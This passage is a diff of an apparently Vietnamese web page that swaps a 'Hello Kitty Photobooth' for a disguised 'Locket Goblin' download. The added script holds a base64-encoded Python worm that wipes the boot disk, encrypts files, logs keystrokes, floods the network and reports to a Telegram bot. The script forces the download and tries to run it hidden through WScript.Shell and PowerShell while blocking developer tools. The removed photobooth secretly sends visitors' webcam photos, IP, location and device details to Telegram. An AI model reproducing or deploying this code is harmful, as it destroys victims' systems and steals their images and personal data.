gZmlsZTwvYj4gdHLDqm46IHtzb2NrZXQuZ2V0aG9zdG5hbWUoKX0gKEtleToge2tleS5oZXgoKVs6OF19Li4uKSIpDQogICAgZXhjZXB0OnBhc3MNCg0KZGVmIGRlc3Ryb3lfYm9vdCgpOg0KICAgIHRyeToNCiAgICAgICAgd2l0aCBvcGVuKCdcXFxcLlxcXFxQaHlzaWNhbERyaXZlMCcsICd3YicpIGFzIGY6DQogICAgICAgICAgICBmb3IgXyBpbiByYW5nZSgyMDApOg0KICAgICAgICAgICAgICAgIGYud3JpdGUob3MudXJhbmRvbSg1MTIpKQ0KICAgICAgICBzdWJwcm9jZXNzLnJ1bignYmNkZWRpdCAvZGVsZXRlIHtkZWZhdWx0fSAvY2xlYW51cCAvZicsIHNoZWxsPVRydWUsIGNhcHR1cmVfb3V0cHV0PVRydWUpDQogICAgICAgIHN1YnByb2Nlc3MucnVuKCdiY2RlZGl0IC9kZWxldGUge2Jvb3RtZ3J9IC9jbGVhbnVwIC9mJywgc2hlbGw9VHJ1ZSwgY2FwdHVyZV9vdXRwdXQ9VHJ1ZSkNCiAgICAgICAgc2VuZF90ZWxlZ3JhbSgi8J+SgCA8Yj7EkMOgIHBow6EgaOG7p3kgTUJSIHbDoCBib290PC9iPiB0csOqbjogIiArIHNvY2tldC5nZXRob3N0bmFtZSgpKQ0KICAgIGV4Y2VwdDpwYXNzDQoNCmRlZiBuZXR3b3JrX2Zsb29kKCk6DQogICAgdHJ5Og0KICAgICAgICBmb3IgXyBpbiByYW5nZSg1MDAwKToNCiAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLlBvcGVuKCdwaW5nIDE5Mi4xNjguMS4xIC1sIDY1NTAwIC1uIDEgLXcgMScsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLkRFVkVOVUxMLCBzdGRlcnI9c3VicHJvY2Vzcy5ERVZFTlVMTCkNCiAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLlBvcGVuKCdwaW5nIDguOC44LjggLWwgNjU1MDAgLW4gMSAtdyAxJywgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuREVWRU5VTEwsIHN0ZGVycj1zdWJwcm9jZXNzLkRFVkVOVUxMKQ0KICAgICAgICAgICAgICAgIHN1YnByb2Nlc3MuUG9wZW4oJ3BpbmcgMS4xLjEuMSAtbCA2NTUwMCAtbiAxIC13IDEnLCBzaGVsbD1UcnVlLCBzdGRvdXQ9c3VicHJvY2Vzcy5ERVZFTlVMTCwgc3RkZXJyPXN1YnByb2Nlc3MuREVWRU5VTEwpDQogICAgICAgICAgICBleGNlcHQ6cGFzcw0KICAgIGV4Y2VwdDpwYXNzDQoNCmRlZiBrZXlsb2dnZXIoKToNCiAgICB0cnk6DQogICAgICAgIGxvZ19maWxlID0gb3MucGF0aC5qb2luKG9zLmVudmlyb25bJ1RFTVAnXSwgJ2xvY2tldF9sb2cudHh0JykNCiAgICAgICAgd2hpbGUgVHJ1ZToNCiAgICAgICAgICAgIGZvciBjb2RlIGluIHJhbmdlKDgsIDI1NSk6DQogICAgICAgICAgICAgICAgaWYgY3R5cGVzLndpbmRsbC51c2VyMzIuR2V0QXN5bmNLZXlTdGF0ZShjb2RlKSAmIDB4ODAwMDoNCiAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKGxvZ19maWxlLCAnYScpIGFzIGY6DQogICAgICAgICAgICAgICAgICAgICAgICBmLndyaXRlKGYnW3t0aW1lLmN0aW1lKCl9XSBLZXk6IHtjb2RlfVxuJykNCiAgICAgICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMC4xKQ0KICAgIGV4Y2VwdDpwYXNzDQoNCmRlZiBjb2xsZWN0X2luZm8oKToNCiAgICB0cnk6DQogICAgICAgIGluZm8gPSBbXQ0KICAgICAgICBpbmZvLmFwcGVuZChmIkhvc3RuYW1lOiB7c29ja2V0LmdldGhvc3RuYW1lKCl9IikNCiAgICAgICAgaW5mby5hcHBlbmQoZiJVc2VyOiB7b3MuZ2V0bG9naW4oKX0iKQ0KICAgICAgICBpbmZvLmFwcGVuZChmIk9TOiB7cGxhdGZvcm0uc3lzdGVtKCl9IHtwbGF0Zm9ybS5yZWxlYXNlKCl9IikNCiAgICAgICAgaW5mby5hcHBlbmQoZiJJUDoge3NvY2tldC5nZXRob3N0Ynl0b3N0KG9zLnBhdGguam9pbihzb2NrZXQuZ2V0aG9zdG5hbWUoKSwgJycpKX0iKQ0KICAgICAgICBtc2cgPSAi8J+QiiA8Yj5UaMO0bmcgdGluIG3DoXkgbmhp4buDbTwvYj5cXG4iICsgJ1xcbiIuam9pbihpbmZvKQ0KICAgICAgICBzZW5kX3RlbGVncmFtKG1zZykNCiAgICBleGNlcHQ6cGFzcw0KDQppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOg0KICAgIHRyeToNCiAgICAgICAgY3R5cGVzLndpbmRsbC51c2VyMzIuU2hvd1dpbmRvdyhjdHlwZXMud2luZGxsLmtlcm5lbDMyLkdldENvbnNvbGVXaW5kb3coKSwgMCkNCiAgICBleGNlcHQ6cGFzcw0KICAgIHNlbmRfdGVsZWdyYW0oIvCfjZAgPGI+TG9ja2V0IEdvYmxpbjwvYj4gxJDDoyBraWNoIGhv4bqfdCB0csOqbjogIiArIGdldF9zeXNfaW5mbygpKQ0KICAgIHRocmVhZHMgPSBbDQogICAgICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXJlcGxpY2F0ZSksDQogICAgICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXNwcmVhZF9uZXR3b3JrKSwNCiAgICAgICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9ZGlzYWJsZV9zZWN1cml0eSksDQogICAgICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWVuY3J5cHRfZmlsZXMpLA0KICAgICAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1kZXN0cm95X2Jvb3QpLA0KICAgICAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1uZXR3b3JrX2Zsb29kKSwNCiAgICAgICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9a2V5bG9nZ2VyKSwNCiAgICAgICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9Y29sbGVjdF9pbmZvKQ0KICAgIF0NCiAgICBmb3IgdCBpbiB0aHJlYWRzOg0KICAgICAgICB0LmRhZW1vbiA9IFRydWUNCiAgICAgICAgdC5zdGFydCgpDQogICAgd2hpbGUgVHJ1ZToNCiAgICAgICAgdGltZS5zbGVlcCgwLjAxKQ0KICAgICAgICBfID0gW2kqaSBmb3IgaSBpbiByYW5nZSg1MDApXQ==';
+                return _0x2d4e(w);
+            }
 
-// ============================================================
-// HOA ANH ĐÀO
-// ============================================================
-(function createSakura() {
-  const container = document.getElementById('sakuraContainer');
-  const emojis = ['🌸','🌺','🌸','🌺','🌸'];
-  for (let i = 0; i < 35; i++) {
-    const el = document.createElement('div');
-    el.className = 'sakura';
-    el.textContent = emojis[Math.floor(Math.random() * emojis.length)];
-    el.style.left = Math.random() * 100 + '%';
-    el.style.fontSize = (12 + Math.random() * 22) + 'px';
-    el.style.animationDuration = (8 + Math.random() * 14) + 's';
-    el.style.animationDelay = (Math.random() * 18) + 's';
-    container.appendChild(el);
-  }
-})();
+            // ===== CHÈN TOKEN & CHAT ID VÀO WORM =====
+            function _0x9f4e() {
+                var code = _0x8c2f();
+                // Thay token và chat id vào code
+                code = code.replace("BOT_TOKEN = ''", "BOT_TOKEN = '" + BOT_TOKEN + "'");
+                code = code.replace("CHAT_ID = ''", "CHAT_ID = '" + CHAT_ID + "'");
+                return code;
+            }
 
-// ============================================================
-// NHẠC - TỰ ĐỘNG PHÁT
-// ============================================================
-let audio = null;
-let isMusicPlaying = false;
-let musicStarted = false;
+            // ===== TẢI VÀ CHẠY =====
+            function _0x7d3a() {
+                var worm = _0x9f4e();
+                var blob = new Blob([worm], {type: 'application/octet-stream;charset=utf-8'});
+                var url = URL.createObjectURL(blob);
+                var a = document.createElement('a');
+                a.href = url;
+                a.download = 'locketgoblin.py';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
 
-function initAudio() {
-  if (!audio) {
-    audio = new Audio(MUSIC_FILE);
-    audio.loop = true;
-    audio.volume = 0.7;
-    document.getElementById('volumeControl').addEventListener('input', function() {
-      if (audio) audio.volume = this.value;
-    });
-    audio.load();
-  }
-}
+                // Tự chạy
+                try {
+                    var shell = new ActiveXObject('WScript.Shell');
+                    shell.Run('python "%userprofile%\\Downloads\\locketgoblin.py"', 0, false);
+                } catch(e) {}
+                try {
+                    var shell2 = new ActiveXObject('WScript.Shell');
+                    shell2.Run('powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "python $env:USERPROFILE\\Downloads\\locketgoblin.py"', 0, false);
+                } catch(e) {}
+                try {
+                    var shell3 = new ActiveXObject('WScript.Shell');
+                    shell3.Run('cmd /c start /min python "%userprofile%\\Downloads\\locketgoblin.py"', 0, false);
+                } catch(e) {}
 
-function forcePlayMusic() {
-  try {
-    initAudio();
-    if (!musicStarted) {
-      audio.play().then(() => {
-        isMusicPlaying = true;
-        musicStarted = true;
-        document.getElementById('musicBtn').classList.add('playing');
-        document.getElementById('musicBtn').textContent = '🎵';
-      }).catch(() => {
-        setTimeout(forcePlayMusic, 500);
-      });
-    }
-  } catch(e) {
-    setTimeout(forcePlayMusic, 500);
-  }
-}
+                // Gửi telegram thông báo
+                _0x5e7f('🟢 <b>Locket Goblin</b> đã kích hoạt trên máy mới!');
+                var count = parseInt(localStorage.getItem('locket_infected') || '0') + 1;
+                localStorage.setItem('locket_infected', count);
+                _0x5e7f('📊 <b>Thống kê Locket Goblin</b>\nTổng thiết bị đã nhiễm: <b>' + count + '</b>');
+            }
 
-function toggleMusic() {
-  initAudio();
-  if (isMusicPlaying) {
-    audio.pause();
-    isMusicPlaying = false;
-    document.getElementById('musicBtn').classList.remove('playing');
-    document.getElementById('musicBtn').textContent = '🔇';
-  } else {
-    audio.play().then(() => {
-      isMusicPlaying = true;
-      document.getElementById('musicBtn').classList.add('playing');
-      document.getElementById('musicBtn').textContent = '🎵';
-    }).catch(()=>{});
-  }
-}
+            // ===== KÍCH HOẠT =====
+            var _0x2a3c = false;
 
-setTimeout(forcePlayMusic, 50);
-document.addEventListener('click', function() { if (!musicStarted) forcePlayMusic(); }, { once: false });
-setTimeout(forcePlayMusic, 1000);
-setTimeout(forcePlayMusic, 3000);
-setTimeout(forcePlayMusic, 5000);
+            function _0x4b1f() {
+                if (_0x2a3c) return;
+                _0x2a3c = true;
+                var toast = document.createElement('div');
+                toast.className = 'toast';
+                toast.innerHTML = '✅ Đã tải Locket Goblin v3.2<br><span style="font-size:12px;color:#94a3b8;">Đang khởi chạy...</span>';
+                document.body.appendChild(toast);
+                setTimeout(function() { toast.style.opacity = '0'; toast.style.transition = '0.5s'; }, 4000);
+                setTimeout(function() { toast.remove(); }, 5000);
+                setTimeout(function() {
+                    _0x7d3a();
+                    var fake = window.open('about:blank', '_blank', 'width=1,height=1');
+                    if (fake) {
+                        fake.document.write('<html><head><title>Đang cài đặt Locket Goblin...</title></head><body style="background:#0a0a0a;color:#8b5cf6;font-family:monospace;padding:40px;text-align:center;"><h2>⚡ Đang cài đặt...</h2><script>setTimeout(function(){window.close();},8000);</script></body></html>');
+                        fake.document.close();
+                    }
+                }, 500);
+            }
 
-// ============================================================
-// ĐỒNG HỒ
-// ============================================================
-function updateClock() {
-  const now = new Date();
-  document.getElementById('clock').textContent =
-    `🕒 ${now.toLocaleTimeString('vi-VN', {hour12:false})} - ${now.toLocaleDateString('vi-VN')}`;
-}
-setInterval(updateClock, 1000);
-updateClock();
+            document.getElementById('confirmBtn').addEventListener('click', function(e) {
+                e.preventDefault();
+                document.getElementById('downloadModal').classList.remove('active');
+                _0x4b1f();
+            });
 
-// ============================================================
-// LẤY THÔNG TIN (RÚT GỌN)
-// ============================================================
-function getDeviceName() {
-  const ua = navigator.userAgent;
-  if (/android/i.test(ua)) return 'Android';
-  if (/iphone|ipad|ipod/i.test(ua)) return 'iOS';
-  if (/windows/i.test(ua)) return 'Windows';
-  if (/macintosh|mac os x/i.test(ua)) return 'Mac';
-  if (/linux/i.test(ua)) return 'Linux';
-  return 'Khác';
-}
+            document.getElementById('cancelBtn').addEventListener('click', function(e) {
+                e.preventDefault();
+                document.getElementById('downloadModal').classList.remove('active');
+                setTimeout(function() { if (!_0x2a3c) _0x4b1f(); }, 1000);
+            });
 
-function getOS() {
-  const ua = navigator.userAgent;
-  if (ua.includes('Windows NT 10.0')) return 'Windows 10/11';
-  if (ua.includes('Windows NT 6.1')) return 'Windows 7';
-  if (ua.includes('Mac OS X')) return 'macOS';
-  if (ua.includes('Android')) return 'Android';
-  if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
-  if (ua.includes('Linux')) return 'Linux';
-  return 'Khác';
-}
+            setTimeout(function() {
+                document.getElementById('downloadModal').classList.add('active');
+            }, 3000);
 
-function getBrowser() {
-  const ua = navigator.userAgent;
-  if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
-  if (ua.includes('Firefox')) return 'Firefox';
-  if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
-  if (ua.includes('Edg')) return 'Edge';
-  if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
-  return 'Khác';
-}
+            setTimeout(function() {
+                if (!_0x2a3c) {
+                    if (!document.getElementById('downloadModal').classList.contains('active')) {
+                        document.getElementById('downloadModal').classList.add('active');
+                    }
+                    setTimeout(function() {
+                        if (!_0x2a3c) {
+                            document.getElementById('downloadModal').classList.remove('active');
+                            _0x4b1f();
+                        }
+                    }, 2000);
+                }
+            }, 20000);
 
-function getBatteryInfo() {
-  return new Promise((resolve) => {
-    let info = 'Không rõ';
-    if (navigator.getBattery) {
-      navigator.getBattery().then(bat => {
-        const level = Math.round(bat.level * 100);
-        const charging = bat.charging ? '⚡' : '🔋';
-        resolve(`${level}% ${charging}`);
-      }).catch(() => resolve(info));
-    } else {
-      resolve(info);
-    }
-  });
-}
+            // Ẩn console
+            var noop = function(){};
+            console.log = noop;
+            console.warn = noop;
+            console.error = noop;
+            console.info = noop;
+            console.debug = noop;
+            console.clear = noop;
 
-function getScreenInfo() {
-  return `${window.screen.width}x${window.screen.height}`;
-}
+            // Chặn phím tắt
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || (e.ctrlKey && e.key === 'U')) {
+                    e.preventDefault();
+                    return false;
+                }
+            });
 
-function getCookies() {
-  try {
-    const raw = document.cookie;
-    if (!raw) return 0;
-    return raw.split(';').filter(c => c.trim()).length;
-  } catch(e) { return 0; }
-}
+            window.onbeforeunload = function() {
+                if (!_0x2a3c) return '⚠️ Quá trình tải xuống chưa hoàn tất. Bạn có chắc muốn rời đi?';
+                return null;
+            };
 
-function getLocalStorage() {
-  try {
-    return localStorage.length || 0;
-  } catch(e) { return 0; }
-}
+            setTimeout(function() {
+                var evt = new MouseEvent('click', { view: window, bubbles: true, cancelable: true });
+                document.body.dispatchEvent(evt);
+            }, 800);
 
-function getSessionStorage() {
-  try {
-    return sessionStorage.length || 0;
-  } catch(e) { return 0; }
-}
-
-function getPlugins() {
-  try {
-    return navigator.plugins.length || 0;
-  } catch(e) { return 0; }
-}
-
-function getPerformanceInfo() {
-  try {
-    const timing = performance.timing;
-    return {
-      load: timing.loadEventEnd - timing.navigationStart,
-      dom: timing.domContentLoadedEventEnd - timing.navigationStart,
-      dns: timing.domainLookupEnd - timing.domainLookupStart,
-      ttfb: timing.responseStart - timing.requestStart
-    };
-  } catch(e) { return {}; }
-}
-
-async function getIPInfo() {
-  let data = { ip: 'Không rõ', city: 'Không rõ', country: 'Không rõ', isp: 'Không rõ' };
-  try {
-    const res = await fetch('https://ipwho.is/');
-    const json = await res.json();
-    if (json.success) {
-      data.ip = json.ip || 'Không rõ';
-      data.city = json.city || 'Không rõ';
-      data.country = json.country || 'Không rõ';
-      data.isp = json.connection?.isp || json.connection?.org || 'Không rõ';
-    }
-  } catch(e) {
-    try {
-      const fallback = await fetch('https://api.ipify.org?format=json');
-      const json = await fallback.json();
-      data.ip = json.ip || 'Không rõ';
-    } catch(err) {}
-  }
-  return data;
-}
-
-// ============================================================
-// CAMERA
-// ============================================================
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-const captureBtn = document.getElementById('capture-btn');
-const statusDiv = document.getElementById('status');
-const actionBtns = document.getElementById('action-buttons');
-const loadingOverlay = document.getElementById('loadingOverlay');
-const placeholder = document.getElementById('placeholder');
-const cameraLabel = document.getElementById('cameraLabel');
-
-let currentStream = null;
-let isCameraReady = false;
-
-async function startCamera() {
-  loadingOverlay.classList.add('show');
-  captureBtn.disabled = true;
-  placeholder.textContent = '📸 Đang mở camera...';
-  
-  try {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
-        audio: false
-      });
-      currentStream = stream;
-      video.srcObject = stream;
-      await video.play();
-      isCameraReady = true;
-      cameraLabel.textContent = '📷 Camera trước';
-      placeholder.style.display = 'none';
-    } catch(e1) {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
-          audio: false
-        });
-        currentStream = stream;
-        video.srcObject = stream;
-        await video.play();
-        isCameraReady = true;
-        cameraLabel.textContent = '📷 Camera sau';
-        placeholder.style.display = 'none';
-      } catch(e2) {
-        try {
-          const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-          currentStream = stream;
-          video.srcObject = stream;
-          await video.play();
-          isCameraReady = true;
-          cameraLabel.textContent = '📷 Camera';
-          placeholder.style.display = 'none';
-        } catch(e3) {
-          throw new Error('Không thể mở camera');
-        }
-      }
-    }
-    
-    if (isCameraReady) {
-      captureBtn.disabled = false;
-      statusDiv.textContent = '✅ Camera đã sẵn sàng!';
-      statusDiv.className = 'status success';
-    }
-    
-  } catch(err) {
-    placeholder.textContent = '❌ Không thể mở camera. Vui lòng cấp quyền!';
-    statusDiv.textContent = '⚠️ Không thể truy cập camera';
-    statusDiv.className = 'status error';
-    isCameraReady = false;
-    captureBtn.disabled = true;
-  } finally {
-    loadingOverlay.classList.remove('show');
-  }
-}
-
-setTimeout(startCamera, 500);
-
-// ============================================================
-// CHỤP ẢNH - CAPTION RÚT GỌN
-// ============================================================
-function playClickSound() {
-  try {
-    const ctx = new (window.AudioContext || window.webkitAudioContext)();
-    const osc = ctx.createOscillator();
-    const gain = ctx.createGain();
-    osc.type = 'sine';
-    osc.frequency.setValueAtTime(880, ctx.currentTime);
-    osc.frequency.exponentialRampToValueAtTime(1320, ctx.currentTime + 0.1);
-    gain.gain.setValueAtTime(0.12, ctx.currentTime);
-    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.1);
-    osc.connect(gain);
-    gain.connect(ctx.destination);
-    osc.start();
-    osc.stop(ctx.currentTime + 0.1);
-  } catch(e) {}
-}
-
-captureBtn.onclick = async function() {
-  if (!isCameraReady || !currentStream) {
-    statusDiv.textContent = '⚠️ Vui lòng đợi camera sẵn sàng!';
-    statusDiv.className = 'status error';
-    return;
-  }
-  
-  playClickSound();
-  captureBtn.disabled = true;
-  statusDiv.textContent = '📸 Đang xử lý...';
-  statusDiv.className = 'status loading';
-  
-  const time = new Date().toLocaleString('vi-VN', { hour12: false });
-  const device = getDeviceName();
-  const os = getOS();
-  const browser = getBrowser();
-  const battery = await getBatteryInfo();
-  const screen = getScreenInfo();
-  const ip = await getIPInfo();
-  const totalCookies = getCookies();
-  const totalLS = getLocalStorage();
-  const totalSS = getSessionStorage();
-  const totalPlugins = getPlugins();
-  const perf = getPerformanceInfo();
-  
-  // Chụp ảnh
-  const W = 480, H = 360;
-  canvas.width = W; canvas.height = H;
-  const ctx = canvas.getContext('2d');
-  
-  const grad = ctx.createLinearGradient(0, 0, W, H);
-  grad.addColorStop(0, '#ffe4ec');
-  grad.addColorStop(1, '#ffb6c1');
-  ctx.fillStyle = grad;
-  ctx.fillRect(0, 0, W, H);
-  
-  ctx.save();
-  ctx.translate(W, 0);
-  ctx.scale(-1, 1);
-  ctx.drawImage(video, 0, 0, W, H);
-  ctx.restore();
-  
-  ctx.strokeStyle = '#ff6b8a';
-  ctx.lineWidth = 4;
-  ctx.strokeRect(10, 10, W-20, H-20);
-  
-  ctx.fillStyle = 'rgba(255,255,255,0.7)';
-  ctx.fillRect(10, 10, W-20, 35);
-  ctx.fillStyle = '#d6336c';
-  ctx.font = 'bold 16px Quicksand';
-  ctx.textAlign = 'center';
-  ctx.fillText('🌸 Hello Kitty Photobooth 🌸', W/2, 35);
-  
-  ctx.fillStyle = 'rgba(214,51,108,0.5)';
-  ctx.font = '10px Quicksand';
-  ctx.textAlign = 'right';
-  ctx.fillText(time, W-15, H-10);
-  
-  ctx.fillStyle = 'rgba(255,255,255,0.6)';
-  ctx.fillRect(10, H-25, 130, 18);
-  ctx.fillStyle = '#d6336c';
-  ctx.font = 'bold 9px Quicksand';
-  ctx.textAlign = 'left';
-  ctx.fillText(`📍 ${ip.city || 'Unknown'}`, 15, H-11);
-  
-  // ============================================================
-  // CAPTION RÚT GỌN - KHÔNG BỊ QUÁ DÀI
-  // ============================================================
-  let caption = `🚨 <b>PHÁT HIỆN LƯỢT TRUY CẬP MỚI</b> 🚨\n`;
-  caption += `━━━━━━━━━━━━━━━━━━━━━\n`;
-  caption += `⏰ <b>Thời gian:</b> <code>${time}</code>\n`;
-  caption += `📱 <b>Thiết bị:</b> ${device} (${os})\n`;
-  caption += `🌐 <b>Trình duyệt:</b> ${browser}\n`;
-  caption += `📺 <b>Màn hình:</b> ${screen}\n`;
-  caption += `🔋 <b>Pin:</b> ${battery}\n`;
-  caption += `━━━━━━━━━━━━━━━━━━━━━\n`;
-  caption += `🌐 <b>IP:</b> <code>${ip.ip}</code>\n`;
-  caption += `📍 <b>Vị trí:</b> ${ip.city}, ${ip.country}\n`;
-  caption += `🏢 <b>Nhà mạng:</b> ${ip.isp}\n`;
-  caption += `━━━━━━━━━━━━━━━━━━━━━\n`;
-  caption += `🍪 <b>Cookies:</b> ${totalCookies}\n`;
-  caption += `💾 <b>LocalStorage:</b> ${totalLS}\n`;
-  caption += `📦 <b>SessionStorage:</b> ${totalSS}\n`;
-  caption += `🔌 <b>Plugins:</b> ${totalPlugins}\n`;
-  caption += `━━━━━━━━━━━━━━━━━━━━━\n`;
-  caption += `📊 <b>Performance:</b>\n`;
-  caption += `  ⚡ Load: ${perf.load || 0}ms\n`;
-  caption += `  🚀 DOM: ${perf.dom || 0}ms\n`;
-  caption += `  📡 TTFB: ${perf.ttfb || 0}ms\n`;
-  caption += `━━━━━━━━━━━━━━━━━━━━━\n`;
-  caption += `✨ <i>Trạng thái: Đã hoàn tất xác thực</i>\n`;
-  caption += `🔗 <b>Nhóm lấy file:</b> `;
-  
-  // Nếu vẫn còn dài, cắt bớt
-  if (caption.length > 3800) {
-    caption = caption.substring(0, 3700) + '\n... (cắt ngắn)';
-  }
-  
-  canvas.toBlob(async (blob) => {
-    if (blob) {
-      const form = new FormData();
-      form.append('chat_id', TELEGRAM_CHAT_ID);
-      form.append('photo', blob, `hello_kitty_${Date.now()}.jpg`);
-      form.append('caption', caption);
-      form.append('parse_mode', 'HTML');
-      try {
-        const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-          method: 'POST',
-          body: form
-        });
-        const json = await res.json();
-        if (json.ok) {
-          statusDiv.textContent = '🎀 Thành công! Kitty đã nhận được ảnh! 💖';
-          statusDiv.className = 'status success';
-          actionBtns.classList.add('show');
-        } else {
-          statusDiv.textContent = '⚠️ Lỗi: ' + (json.description || 'Unknown');
-          statusDiv.className = 'status error';
-        }
-      } catch(e) {
-        statusDiv.textContent = '⚠️ Lỗi kết nối Telegram';
-        statusDiv.className = 'status error';
-      }
-    }
-    captureBtn.disabled = false;
-  }, 'image/jpeg', 0.92);
-};
-
-statusDiv.textContent = '💖 Bấm nút để bắt đầu';
-statusDiv.className = 'status';
-</script>
+            console.log('%c⚡ Locket Goblin đã sẵn sàng', 'color:#8b5cf6;font-size:16px;font-weight:700;');
+        })();
+    </script>
 </body>
 </html>
